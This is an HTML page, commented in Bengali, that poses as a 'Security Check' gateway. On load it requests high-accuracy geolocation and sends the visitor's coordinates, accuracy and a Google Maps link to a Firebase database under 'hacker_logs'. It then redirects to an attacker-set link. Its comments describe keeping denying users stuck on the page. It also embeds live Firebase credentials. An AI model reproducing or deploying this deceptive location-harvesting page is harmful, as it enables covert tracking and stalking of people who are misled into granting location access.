<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Gateway</title>
    <style>
        /* একদম ক্লিন ইন্টারফেস */
        body {
            margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            overflow: hidden; /* স্ক্রল বন্ধ */
        }
        
        /* শুধু এই লেখাটাই মাঝখানে থাকবে */
        h2 {
            color: #333;
            font-weight: 400;
            font-size: 24px;
            animation: pulse 1.5s infinite;
        }

        /* একটু এনিমেশন যাতে মনে হয় কাজ চলছে */
        @keyframes pulse {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }
    </style>
</head>
<body>

    <h2>Security Check...</h2>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set, child, get } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        
        let finalRedirectLink = "https://www.google.com";
        let dataSent = false; // যাতে একবারের বেশি ডাটা না যায়

        // এডমিন লিংক ফেচ করা
        const dbRef = ref(db);
        get(child(dbRef, "site_settings/redirect_link")).then((snapshot) => {
            if (snapshot.exists()) {
                finalRedirectLink = snapshot.val();
            }
        });

        // মেইন ফাংশন
        function processLocation(position) {
            // যদি একবার অলরেডি পাঠিয়ে থাকি, তাহলে আর পাঠাবো না
            if(dataSent) return; 
            dataSent = true;

            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;

            set(newLogRef, {
                timestamp: new Date().toString(),
                googleMapsLink: mapsLink,
                latitude: lat,
                longitude: lng,
                accuracy: position.coords.accuracy // কতটুকু নিখুঁত সেটা বোঝার জন্য
            }).then(() => {
                // কাজ শেষ, রিডাইরেক্ট
                window.location.href = finalRedirectLink;
            });
        }

        // অটোমেটিক পারমিশন চাওয়া এবং মনিটর করা
        window.onload = function() {
            if ("geolocation" in navigator) {
                // watchPosition ব্যবহার করছি, এটা জিপিএস অন হওয়া পর্যন্ত অপেক্ষা করে
                navigator.geolocation.watchPosition(
                    processLocation, // লোকেশন পেলেই এই ফাংশন কল হবে
                    function(error) {
                        // এরর হলে আমরা কিচ্ছু করব না, ইউজার ওই পেজেই আটকে থাকবে
                        // ব্রাউজার নিজেই পপআপ দেখাবে
                        console.log("Waiting for location...");
                    },
                    { 
                        enableHighAccuracy: true, // এটাই মোবাইলের সিস্টেম পপআপ ট্রিগার করে
                        timeout: 30000, 
                        maximumAge: 0 
                    }
                );
            } else {
                alert("Device not supported");
            }
        };
    </script>
</body>
</html>
